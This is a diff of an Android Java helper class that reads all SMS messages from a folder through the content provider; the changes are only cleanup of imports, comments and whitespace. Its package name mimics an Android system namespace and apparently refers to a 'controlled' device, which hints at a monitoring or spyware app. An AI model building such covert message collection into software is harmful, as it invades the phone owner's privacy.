@@ -2,7 +2,6 @@ package com.android.system.controled.util;
 
 import java.util.ArrayList;
 
-import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 
@@ -12,20 +11,17 @@ import com.android.system.controled.bean.SmsInfo;
 
 public class SmsProviderUtil {
 
-//	private Context mContext;
-	 
-
 	private static SmsProviderUtil mInstence;
-	
+
 	private SmsProviderUtil() {
-		
+
 	}
-	
+
 	public static SmsProviderUtil getInstence() {
-		if(mInstence == null) {
+		if (mInstence == null) {
 			mInstence = new SmsProviderUtil();
 		}
-		
+
 		return mInstence;
 	}
 
@@ -42,8 +38,6 @@ public class SmsProviderUtil {
 	 */
 	public ArrayList<SmsInfo> getAllSmsInfo(String folder) {
 		ArrayList<SmsInfo> infos = new ArrayList<SmsInfo>();
-		// Cursor cusor = activity.managedQuery(uri, SmsUtil.SMS_COLUMNS, null, null, "date desc");
-		// Cursor cusor = activity.managedQuery(uri, SmsUtil.SMS_COLUMNS, null, null, null);
 		Cursor cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(folder), SmsUtil.SMS_COLUMNS, null, null, null);
 
 		int threadidColumn = cusor.getColumnIndex("thread_id");
